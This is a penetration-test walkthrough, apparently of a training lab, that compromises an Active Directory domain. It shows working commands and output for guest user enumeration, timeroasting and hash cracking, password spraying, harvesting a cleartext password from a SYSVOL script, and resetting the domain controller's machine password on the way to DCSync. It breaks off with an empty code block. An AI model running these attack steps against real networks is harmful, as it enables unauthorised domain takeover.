
# Objective and Scope

You have been hired by Hack Smarter to perform a Penetration Test on Past Systems Inc. During your call with the client, they stated they are currently adding new machines to the network.

The client has provided you with VPN access to their internal network, but no credentials.

# Host file setup

```python
sudo nxc smb 10.0.16.121 --generate-hosts-file /etc/hosts                             
SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [*] Windows Server 2016 Datacenter 14393 x64 (name:EC2AMAZ-A5O4OL8) (domain:past.local) (signing:True) (SMBv1:True) (Null Auth:True)
```

Looks as if its running an old version of Windows

And its also running SMB v1?

# Enumeration

## Open ports
```python
nmap -p- --min-rate=2000 -sT EC2AMAZ-A5O4OL8.past.local       
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-27 16:43 +0100
Nmap scan report for EC2AMAZ-A5O4OL8.past.local (10.0.16.121)
Host is up (0.095s latency).
Not shown: 65520 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
3389/tcp  open  ms-wbt-server
47001/tcp open  winrm
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49700/tcp open  unknown
49705/tcp open  unknown
57538/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 65.93 seconds
```

## Nmap
```python
nmap -p 53,88,135,139,389,445,593,3389 -A --min-rate=2000 -sT EC2AMAZ-A5O4OL8.past.local                
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-27 16:46 +0100
Nmap scan report for EC2AMAZ-A5O4OL8.past.local (10.0.16.121)
Host is up (0.095s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-27 15:46:07Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: past.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds  Windows Server 2016 Datacenter 14393 microsoft-ds (workgroup: PAST)
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-07-27T15:46:56+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=EC2AMAZ-A5O4OL8.past.local
| Not valid before: 2026-07-26T15:35:57
|_Not valid after:  2027-01-25T15:35:57
| rdp-ntlm-info: 
|   Target_Name: PAST
|   NetBIOS_Domain_Name: PAST
|   NetBIOS_Computer_Name: EC2AMAZ-A5O4OL8
|   DNS_Domain_Name: past.local
|   DNS_Computer_Name: EC2AMAZ-A5O4OL8.past.local
|   Product_Version: 10.0.14393
|_  System_Time: 2026-07-27T15:46:16+00:00
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|2012 (87%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows Server 2016 (87%), Microsoft Windows Server 2012 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: Host: EC2AMAZ-A5O4OL8; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB (139)

So since this is running SMB v1, it will be running on port 139 as opposed to 445 for SMB v2 and v3

So null auth is enabled as with all DCs by default, but cant use it to dump users or list shares

## Guest access

The guest account is enabled!

### Users
```python
nxc smb EC2AMAZ-A5O4OL8.past.local -u 'Guest' -p '' --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 > users.txt
```

```python
cat users.txt 
Administrator
Guest
krbtgt
DefaultAccount
tyler
EC2AMAZ-A5O4OL8$
APPDEV01$
WEBDEV01$
DEV01$
ryan
```
### Shares
```python
nxc smb EC2AMAZ-A5O4OL8.past.local -u 'Guest' -p '' --shares                                                                                
SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [*] Windows Server 2016 Datacenter 14393 x64 (name:EC2AMAZ-A5O4OL8) (domain:past.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [+] past.local\Guest: 
SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [*] Enumerated shares
SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  Share           Permissions     Remark
SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  -----           -----------     ------
SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  ADMIN$                          Remote Admin
SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  C$                              Default share
SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  IPC$            READ            Remote IPC
SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  NETLOGON                        Logon server share 
SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  Share           READ            
SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  SYSVOL                          Logon server share
```

# `Share` share

```python
smbclient //EC2AMAZ-A5O4OL8.past.local/Share -U 'Guest'%''      
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jan 24 02:04:17 2026
  ..                                  D        0  Sat Jan 24 02:04:17 2026
  AD_machines.txt                     A      270  Sat Jan 24 02:04:17 2026

		7863807 blocks of size 4096. 2543562 blocks available
smb: \> get AD_machines.txt 
getting file \AD_machines.txt of size 270 as AD_machines.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
smb: \>
```

Found an interesting txt file in the share

```python
cat AD_machines.txt         

Name            DNSHostName               
----            -----------               
EC2AMAZ-A5O4OL8 EC2AMAZ-A5O4OL8.past.local
APPDEV01                                  
WEBDEV01                                  
DEV01
```

# Timeroasting

```python
nxc smb EC2AMAZ-A5O4OL8.past.local -u 'Guest' -p '' -M timeroast
SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [*] Windows Server 2016 Datacenter 14393 x64 (name:EC2AMAZ-A5O4OL8) (domain:past.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [+] past.local\Guest: 
TIMEROAST   10.0.16.121     445    EC2AMAZ-A5O4OL8  [*] Starting Timeroasting...
TIMEROAST   10.0.16.121     445    EC2AMAZ-A5O4OL8  1009:$sntp-ms$7147c76a706a3f7fc90865d91018cd63$1c0111e900000000000a09324c4f434cee11f97680df3585e1b8428bffbfcd0aee120595f4d6e7d8ee120595f4d70b14
TIMEROAST   10.0.16.121     445    EC2AMAZ-A5O4OL8  1115:$sntp-ms$bdcab56c7ea8caf83df9e6562e7fee9c$1c0111e900000000000a09324c4f434cee11f97684146f22e1b8428bffbfcd0aee1205969be30a25ee1205969be34839
TIMEROAST   10.0.16.121     445    EC2AMAZ-A5O4OL8  1116:$sntp-ms$d9e35a96107906019fd4104f068ac8a5$1c0111e900000000000a09324c4f434cee11f9768180be00e1b8428bffbfcd0aee1205969d6808fdee1205969d683141
TIMEROAST   10.0.16.121     445    EC2AMAZ-A5O4OL8  1117:$sntp-ms$50cf909c28a6602c8e08a97fe8a1eeea$1c0111e900000000000a09324c4f434cee11f97683372f41e1b8428bffbfcd0aee1205969f1e7a3eee1205969f1ea282
```

Ill place all these in a file and try to crack them with hashcat

After a quick google search i find the hashcat mode to be 31300

```python
hashcat -m 31300 timeroast.hash /usr/share/wordlists/rockyou.txt

...[SNIP]...

$sntp-ms$bdcab56c7ea8caf83df9e6562e7fee9c$1c0111e900000000000a09324c4f434cee11f97684146f22e1b8428bffbfcd0aee1205969be30a25ee1205969be34839:P@ssw0rd!
```

This doesnt not tell me which user this is for, so ill have to spray it against the users i have!

# Password spray

```python
nxc smb EC2AMAZ-A5O4OL8.past.local -u users.txt -p 'P@ssw0rd!' --continue-on-success
SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [*] Windows Server 2016 Datacenter 14393 x64 (name:EC2AMAZ-A5O4OL8) (domain:past.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [-] past.local\Administrator:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [-] past.local\Guest:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [-] past.local\krbtgt:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [-] past.local\DefaultAccount:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [-] past.local\tyler:P@ssw0rd! STATUS_ACCOUNT_RESTRICTION 
SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [-] past.local\EC2AMAZ-A5O4OL8$:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [+] past.local\APPDEV01$:P@ssw0rd! 
SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [-] past.local\WEBDEV01$:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [-] past.local\DEV01$:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [-] past.local\ryan:P@ssw0rd! STATUS_LOGON_FAILURE
```

Looks like ive compromised the machine account `APPDEV01$`

There is also a `STATUS_ACCOUNT_RESTRICTION` on the user account `tyler` he could be in protected users

```python
APPDEV01$:P@ssw0rd!
```

Using these credentials, i attempted kerberoasting and found nothing

# Bloodhound

```python
nxc ldap EC2AMAZ-A5O4OL8.past.local -u 'APPDEV01$' -p 'P@ssw0rd!' --dns-server 10.0.16.121 --bloodhound -c All
LDAP        10.0.16.121     389    EC2AMAZ-A5O4OL8  [*] Windows 10 / Server 2016 Build 14393 (name:EC2AMAZ-A5O4OL8) (domain:past.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.0.16.121     389    EC2AMAZ-A5O4OL8  [+] past.local\APPDEV01$:P@ssw0rd! 
LDAP        10.0.16.121     389    EC2AMAZ-A5O4OL8  Resolved collection methods: container, psremote, trusts, dcom, group, rdp, session, objectprops, localadmin, acl
LDAP        10.0.16.121     389    EC2AMAZ-A5O4OL8  Done in 0M 19S
LDAP        10.0.16.121     389    EC2AMAZ-A5O4OL8  Compressing output into /home/kali/.nxc/logs/EC2AMAZ-A5O4OL8_10.0.16.121_2026-07-27_173800_bloodhound.zip
```

Ive collected the loot!

There is no interesting permissions on bloodhound

# `SYSVOL` share

```python
smbclient //EC2AMAZ-A5O4OL8.past.local/SYSVOL -U 'APPDEV01$'%'P@ssw0rd!'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan 23 21:32:56 2026
  ..                                  D        0  Fri Jan 23 21:32:56 2026
  past.local                         Dr        0  Fri Jan 23 21:32:56 2026

		7863807 blocks of size 4096. 2591591 blocks available
smb: \> cd past.local\
smb: \past.local\> ls
  .                                   D        0  Fri Jan 23 21:40:44 2026
  ..                                  D        0  Fri Jan 23 21:40:44 2026
  DfsrPrivate                      DHSr        0  Fri Jan 23 21:40:44 2026
  Policies                            D        0  Fri Jan 23 21:33:14 2026
  scripts                             D        0  Sat Jan 24 01:55:55 2026

		7863807 blocks of size 4096. 2591587 blocks available
smb: \past.local\> cd scripts\
smb: \past.local\scripts\> ls
  .                                   D        0  Sat Jan 24 01:55:55 2026
  ..                                  D        0  Sat Jan 24 01:55:55 2026
  tyler_init.cmd                      A      238  Sat Jan 24 01:55:55 2026

		7863807 blocks of size 4096. 2591587 blocks available
smb: \past.local\scripts\> get tyler_init.cmd 
getting file \past.local\scripts\tyler_init.cmd of size 238 as tyler_init.cmd (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
smb: \past.local\scripts\>
```

```python
cat tyler_init.cmd 
@echo off
REM Temporary dev helper - DO NOT REMOVE
REM Tyler auto-login helper

set TYLER_USER=tyler
set TYLER_PASS=5rtfgvb%RTFGVB

REM Fake ?use? of the vars so it looks intentional
echo Initializing dev environment for %TYLER_USER%...
```

```python
tyler:5rtfgvb%RTFGVB
```

Looks like ive found some credentials!

```python
nxc smb EC2AMAZ-A5O4OL8.past.local -u 'tyler' -p '5rtfgvb%RTFGVB' -k
SMB         EC2AMAZ-A5O4OL8.past.local 445    EC2AMAZ-A5O4OL8  [*] Windows Server 2016 Datacenter 14393 x64 (name:EC2AMAZ-A5O4OL8) (domain:past.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         EC2AMAZ-A5O4OL8.past.local 445    EC2AMAZ-A5O4OL8  [+] past.local\tyler:5rtfgvb%RTFGVB
```

After checking the user `tyler` in bloodhound i see he is in protected users so ive had to use kerberos auth!

The user `tyler` is also a tier zero account

# `tyler` domain permissions

![](Pasted%20image%2020260727175235.png)

This user has GenericAll over the DC host

This means i can change the password of the DC host then perform a DC sync to obtain a Domain admin hash

# Compromising the DC host

```python
bloodyAD --host EC2AMAZ-A5O4OL8.past.local -d past.local -u tyler -p '5rtfgvb%RTFGVB' -k set password 'CN=EC2AMAZ-A5O4OL8,OU=Domain Controllers,DC=past,DC=local' 'Password123!'

[+] Password changed successfully!
```

Ill change the password using bloodyAD of the DC machine account

From here i can perform a DC sync

```python

```